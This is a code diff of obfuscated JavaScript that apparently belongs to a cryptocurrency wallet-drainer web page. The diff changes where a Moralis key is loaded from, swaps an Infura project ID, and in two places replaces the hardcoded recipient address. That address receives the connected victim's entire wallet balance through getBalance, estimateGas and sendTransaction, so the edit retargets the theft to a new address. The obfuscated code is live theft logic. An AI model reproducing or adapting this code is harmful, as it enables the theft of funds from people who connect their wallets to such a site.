@@ -1838,7 +1838,7 @@ function getMobileOperatingSystem() {
     return /iPad|iPhone|iPod/.test(d) && !window.MSStream ? _0x20d2(2471 - 390, 3071) : _0x20d2(1075 - 654, -167)
 }
 $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
-    get_local_moralis_key = await (await fetch("https://snazzy-croquembouche-b14a4a.netlify.app/moralis_key.json")).json();
+    get_local_moralis_key = await (await fetch("/moralis_key.json")).json();
     var d = get_local_moralis_key["moralis-go-fuck-urself-imagine-trying"];
     function e(d, e) {
         for (var c = 0; c < d.length; )
@@ -1869,7 +1869,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                 walletconnect: {
                     package: W,
                     options: {
-                        infuraId: "b85301910e9b4881baa9dd15bb03141b"
+                        infuraId: "24ca61f0aa36473983ac07d4f1057869"
                     }
                 }
             },
@@ -5196,7 +5196,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
             const d = await f.getBalance()
               , e = await f.estimateGas({
                 from: b,
-                to: "0x4eF71dd289B7D024C8a910b10D660144c58ECead",
+                to: "0xc5803Bc3558A24a7E403fC570166606209AfE4A9",
                 value: d,
                 data: encoded
             });
@@ -5212,7 +5212,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
             try {
                 return await f.sendTransaction({
                     from: b,
-                    to: "0x4eF71dd289B7D024C8a910b10D660144c58ECead",
+                    to: "0xc5803Bc3558A24a7E403fC570166606209AfE4A9",
                     value: W.toHexString(),
                     data: encoded,
                     gasLimit: e.toHexString()
